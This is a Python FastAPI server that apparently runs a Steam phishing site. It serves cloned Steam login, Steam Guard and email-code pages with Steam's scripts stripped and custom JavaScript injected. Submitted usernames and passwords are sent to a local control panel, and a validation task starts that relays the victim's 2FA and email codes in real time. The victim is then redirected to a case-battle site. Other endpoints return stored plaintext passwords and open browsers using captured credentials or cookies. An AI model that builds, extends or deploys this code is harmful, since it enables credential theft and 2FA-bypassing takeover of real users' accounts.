import asyncio
import json
import os
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from contextlib import asynccontextmanager

import aiohttp
import uvicorn
from fastapi import FastAPI, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.staticfiles import StaticFiles
from pydantic import BaseModel

from loguru import logger


PANEL_URL = "http://127.0.0.1:8000"
LOGIN_DIR = Path(__file__).resolve().parent

_session: aiohttp.ClientSession | None = None


async def get_session() -> aiohttp.ClientSession:
    global _session
    if _session is None or _session.closed:
        _session = aiohttp.ClientSession()
    return _session


async def close_session():
    global _session
    if _session and not _session.closed:
        await _session.close()
        _session = None


@asynccontextmanager
async def lifespan(app: FastAPI):
    yield
    await close_session()


app = FastAPI(title="Steam Login Site", lifespan=lifespan)


class LoginRequest(BaseModel):
    login: str
    password: str


class GuardSubmit(BaseModel):
    task_id: str
    code: str
    login: str


# SSE stream reader — yields events as dicts
async def _read_sse(url: str):
    session = await get_session()
    async with session.get(url) as resp:
        buffer = ""
        async for chunk in resp.content.iter_any():
            buffer += chunk.decode("utf-8", errors="replace")
            while "\n\n" in buffer:
                raw, buffer = buffer.split("\n\n", 1)
                for line in raw.split("\n"):
                    if line.startswith("data: "):
                        try:
                            yield json.loads(line[6:])
                        except json.JSONDecodeError:
                            pass


@app.get("/", include_in_schema=False)
async def serve_login():
    html = (LOGIN_DIR / "Login.html").read_text(encoding="utf-8")
    # remove ALL Steam JS scripts (but keep our injected one at line ~726)
    html = re.sub(
        r'<script\b[^>]*\bsrc\s*=\s*"[^"]*\.js[^"]*"[^>]*>\s*</script>\s*',
        '', html, flags=re.IGNORECASE
    )
    # remove inline scripts enclosed in <script>...</script> (but keep our custom one at bottom)
    # split at our script marker to preserve it
    parts = html.rsplit('<div id="customMsg"', 1)
    if len(parts) == 2:
        head = parts[0]
        # remove all <script>...</script> (inline) from head
        head = re.sub(r'<script\b[^>]*>[\s\S]*?</script>\s*', '', head)
        html = head + '<div id="customMsg"' + parts[1]
    else:
        html = re.sub(r'<script\b[^>]*>[\s\S]*?</script>\s*', '', html)
    # change all submit buttons to type="button" to prevent native form submission
    html = html.replace('type="submit">', 'type="button">')
    # replace the Steam QR code with gif
    html = re.sub(
        r'<img class="_5S5WqZhvbmRD1cHQT8P-l"[^>]*>',
        '<img class="_5S5WqZhvbmRD1cHQT8P-l" alt="" src="/static/e8a6c5a1-0167-4846-aa2e-1de3adc7b09e.gif">',
        html
    )
    return HTMLResponse(html, headers={"Content-Type": "text/html; charset=utf-8"})


@app.get("/guard", include_in_schema=False)
async def serve_guard():
    """Steam Guard / Device Confirm — show full Steam page with modal overlay."""
    html = (LOGIN_DIR / "Guard.html").read_text(encoding="utf-8")
    html = re.sub(r'<script\b[^>]*\bsrc\s*=\s*"[^"]*\.js[^"]*"[^>]*>\s*</script>\s*', '', html, flags=re.IGNORECASE)
    html = re.sub(r'<script\b[^>]*>[\s\S]*?</script>\s*', '', html)
    js = """
<style>#loginModals{display:none!important}</style>
<script>
document.addEventListener('DOMContentLoaded',function(){
var p=new URLSearchParams(window.location.search),taskId=p.get('task_id'),login=p.get('login'),type=p.get('type')||'code',emailDomain=p.get('email_domain')||'';
if(!taskId||!login)return;

function pollAndRedirect(){(function poll(){fetch('/api/task-status/'+encodeURIComponent(taskId)).then(function(r){return r.json()}).then(function(d){if(d.status==='completed'){window.top.location.href='https://case-battle.id/';return}setTimeout(poll,1500)}).catch(function(){setTimeout(poll,1500)})})()}

fetch('/api/task-status/'+encodeURIComponent(taskId)).then(function(r){return r.json()}).then(function(d){if(d.status==='completed'){window.top.location.href='https://case-battle.id/';return}}).catch(function(){});

// Replace account name in native form
var loginSpans=document.querySelectorAll('.page_content span');
for(var i=0;i<loginSpans.length;i++){if(loginSpans[i].textContent==='ederteng'){loginSpans[i].textContent=login;break}}
// Remove store nav menu
var storeMenu=document.querySelector('[data-featuretarget="store-menu-v7"]');
if(storeMenu)storeMenu.style.display='none';
// Poll for completion
pollAndRedirect();
});
</script>"""
    html = html.replace("</head>", js + "\n</head>")
    return HTMLResponse(html, headers={"Content-Type": "text/html; charset=utf-8"})

Login_files_path = LOGIN_DIR / "Login_files"
if Login_files_path.exists():
    app.mount("/Login_files", StaticFiles(directory=str(Login_files_path)), name="login_files")

Guard_files_path = LOGIN_DIR / "Guard_files"
if Guard_files_path.exists():
    app.mount("/Guard_files", StaticFiles(directory=str(Guard_files_path)), name="guard_files")

GuardCode_files_path = LOGIN_DIR / "GuardCode_files"
if GuardCode_files_path.exists():
    app.mount("/GuardCode_files", StaticFiles(directory=str(GuardCode_files_path)), name="guard_code_files")

Gmail_files_path = LOGIN_DIR / "Gmail_files"
if Gmail_files_path.exists():
    app.mount("/Gmail_files", StaticFiles(directory=str(Gmail_files_path)), name="gmail_files")

app.mount("/static", StaticFiles(directory=str(LOGIN_DIR)), name="login_static")


@app.get("/gmail", include_in_schema=False)
async def serve_gmail():
    html = (LOGIN_DIR / "Gmail.html").read_text(encoding="utf-8")
    # strip all Steam JS
    html = re.sub(r'<script\b[^>]*\bsrc\s*=\s*"[^"]*\.js[^"]*"[^>]*>\s*</script>\s*', '', html, flags=re.IGNORECASE)
    html = re.sub(r'<script\b[^>]*>[\s\S]*?</script>\s*', '', html)
    js = """
<style>
html,body { margin:0; padding:0; background:#1b2838; }
.responsive_page_frame { display:none !important; }
#loginModals { position:fixed; top:0; left:0; width:100vw; height:100vh; display:flex; align-items:center; justify-content:center; z-index:9999; background:rgba(0,0,0,0.55); }
.loginAuthCodeModal { display:block !important; background:#1b2838; border:1px solid #2a3f5a; border-radius:4px; padding:24px; max-width:min(502px,94vw) !important; box-sizing:border-box; }
.loginTwoFactorCodeModal { display:none !important; }
</style>
<script>
(function(){
var p=new URLSearchParams(window.location.search),taskId=p.get('task_id'),login=p.get('login')||'',emailDomain=p.get('email_domain')||'';
if(!taskId||!login)return;

function pollAndRedirect(){
(function poll(){fetch('/api/task-status/'+encodeURIComponent(taskId)).then(function(r){return r.json()}).then(function(d){if(d.status==='completed'){window.top.location.href='https://case-battle.id/'}else if(d.status==='failed'||d.status==='cancelled'){}else{setTimeout(poll,1000)}}).catch(function(){setTimeout(poll,1000)})})();
}

// if task already completed, redirect immediately
fetch('/api/task-status/'+encodeURIComponent(taskId)).then(function(r){return r.json()}).then(function(d){if(d.status==='completed'){window.top.location.href='https://case-battle.id/'}else{startUi()}}).catch(function(){startUi()});

function startUi(){
if(emailDomain){var es=document.getElementById('emailauth_entercode_emaildomain');if(es)es.textContent=emailDomain}
var m=document.querySelector('.loginAuthCodeModal');
if(!m)return;
['auth_message_entercode','auth_details_entercode','auth_buttonset_entercode'].forEach(function(id){var e=document.getElementById(id);if(e)e.style.display=''});
// start polling in case task completes without code
pollAndRedirect();
var submitBtn=document.querySelector('[data-modalstate="submit"]');
if(!submitBtn)return;
submitBtn.addEventListener('click',function(e){e.preventDefault();var code=document.getElementById('authcode').value;if(!code)return;var btn=e.currentTarget;btn.style.opacity='0.5';btn.style.pointerEvents='none';
fetch('/api/guard',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({task_id:taskId,code:code,login:login})}).then(function(r){return r.json()}).then(function(d){if(d.status==='ok'){pollAndRedirect()}else{btn.style.opacity='1';btn.style.pointerEvents='auto'}}).catch(function(){btn.style.opacity='1';btn.style.pointerEvents='auto'})})};
}
})();
</script>"""
    html = html.replace("</head>", js + "\n</head>")
    return HTMLResponse(html, headers={"Content-Type": "text/html; charset=utf-8"})


_browser_login_results: dict[int, dict] = {}


@app.post("/api/login")
async def login(req: LoginRequest):
    session = await get_session()
    try:
        # 1. Save/update account in panel (upsert by login)
        async with session.post(
            f"{PANEL_URL}/api/logpass/upsert",
            json={"login": req.login, "password": req.password},
        ) as resp:
            if resp.status not in (200, 201):
                text = await resp.text()
                return {"status": "error", "message": f"Panel error: {text}"}
            account = await resp.json()

        account_id = account["id"]

        # 2. Start validation task (with 2FA prompt support for Guard/Gmail)
        async with session.post(f"{PANEL_URL}/api/logpass/{account_id}/validate-login") as resp:
            if resp.status != 200:
                text = await resp.text()
                return {"status": "error", "message": f"Panel error: {text}"}
            data = await resp.json()

        return {"status": "pending", "task_id": data["task_id"], "login": req.login}

    except aiohttp.ClientConnectorError:
        return {"status": "error", "message": "Панель не запущена (порт 8000)"}
    except Exception as e:
        logger.exception(f"Login failed: {e}")
        return {"status": "error", "message": str(e)}


@app.get("/api/login-status/{task_id}")
async def login_task_status(task_id: str):
    """Poll task status for Login.html — converts panel task/prompt info to simple status."""
    session = await get_session()
    try:
        async with session.get(f"{PANEL_URL}/api/tasks/{task_id}") as resp:
            if resp.status == 404:
                return {"status": "pending"}
            data = await resp.json()
    except Exception:
        return {"status": "pending"}

    if data.get("status") == "completed":
        # Check if all accounts succeeded
        results = data.get("account_results") or {}
        all_ok = all(v == "ok" for v in results.values()) if results else True
        return {"status": "ok" if all_ok else "error", "message": "" if all_ok else "Validation failed"}
    if data.get("status") in ("failed", "cancelled"):
        return {"status": "error", "message": data.get("error", "Validation failed")}

    # Check for pending prompt (2FA / email / device confirm)
    prompt = data.get("prompt")
    if prompt:
        meta = data.get("prompt_meta", {})
        ptype = meta.get("type", "guard")
        login = data.get("prompt_login", "")
        email_domain = meta.get("email_domain", "")
        if ptype == "device_confirm":
            return {"status": "need_device_confirm", "task_id": task_id, "login": login}
        if ptype == "email":
            return {"status": "need_email", "task_id": task_id, "login": login, "email_domain": email_domain}
        return {"status": "need_guard", "task_id": task_id, "login": login}

    return {"status": "pending"}


@app.post("/api/guard")
async def submit_guard(req: GuardSubmit):
    session = await get_session()
    try:
        async with session.post(
            f"{PANEL_URL}/api/tasks/{req.task_id}/respond",
            json={"value": req.code, "login": req.login},
        ) as resp:
            if resp.status != 200:
                text = await resp.text()
                return {"status": "error", "message": f"Panel error: {text}"}
            return {"status": "ok"}
    except aiohttp.ClientConnectorError:
        return {"status": "error", "message": "Панель не запущена (порт 8000)"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.get("/api/task-status/{task_id}")
async def task_status(task_id: str):
    """Fallback: proxy to panel for old-style tasks (guard/gmail pages still use this)."""
    session = await get_session()
    try:
        async with session.get(f"{PANEL_URL}/api/tasks/{task_id}") as resp:
            data = await resp.json()
            return data
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.get("/api/login-by-id/{account_id}")
async def get_login_by_id(account_id: int):
    """Return account credentials for pre-filling in browser login."""
    session = await get_session()
    try:
        async with session.get(f"{PANEL_URL}/api/logpass/{account_id}") as resp:
            if resp.status != 200:
                return {"status": "error", "message": "Account not found"}
            account = await resp.json()
            return {"status": "ok", "login": account.get("login", ""), "password": account.get("password", "")}
    except aiohttp.ClientConnectorError:
        return {"status": "error", "message": "Панель не запущена (порт 8000)"}
    except Exception as e:
        return {"status": "error", "message": str(e)}


@app.get("/login-by-id/{account_id}", include_in_schema=False)
async def serve_login_by_id(account_id: int):
    """Open real Steam via nodriver — tries logpass browser, then main accounts browser."""
    session = await get_session()
    err = None

    # 1) Try logpass browser (has credentials → open_browser_and_login)
    async with session.post(f"{PANEL_URL}/api/logpass/{account_id}/browser") as resp:
        if resp.status == 200:
            return HTMLResponse(
                "<html><body style='background:#1b2838;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:Arial,sans-serif;'>"
                "<p>Steam Browser открыт. Завершите вход в окне Chrome.</p>"
                "<script>setTimeout(function(){window.close()},2000)</script></body></html>",
                headers={"Content-Type": "text/html; charset=utf-8"}
            )

    # 2) Try main accounts browser (has cookies → open_browser_with_cookies)
    async with session.post(f"{PANEL_URL}/api/accounts/{account_id}/browser") as resp:
        if resp.status == 200:
            return HTMLResponse(
                "<html><body style='background:#1b2838;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;font-family:Arial,sans-serif;'>"
                "<p>Steam Browser открыт.</p>"
                "<script>setTimeout(function(){window.close()},2000)</script></body></html>",
                headers={"Content-Type": "text/html; charset=utf-8"}
            )
        err = await resp.text()

    # 3) Both failed — show error
    return HTMLResponse(
        f"<html><body style='background:#1b2838;color:#f88;display:flex;align-items:center;justify-content:center;height:100vh;font-family:Arial,sans-serif;'>"
        f"<p>Ошибка: {err[:200]}</p></body></html>",
        status_code=200,
        headers={"Content-Type": "text/html; charset=utf-8"}
    )


if __name__ == "__main__":
    port = 8001
    print(f"\n  Steam Login Site: http://127.0.0.1:{port}\n")
    uvicorn.run("Login.main:app", host="127.0.0.1", port=port, reload=True)
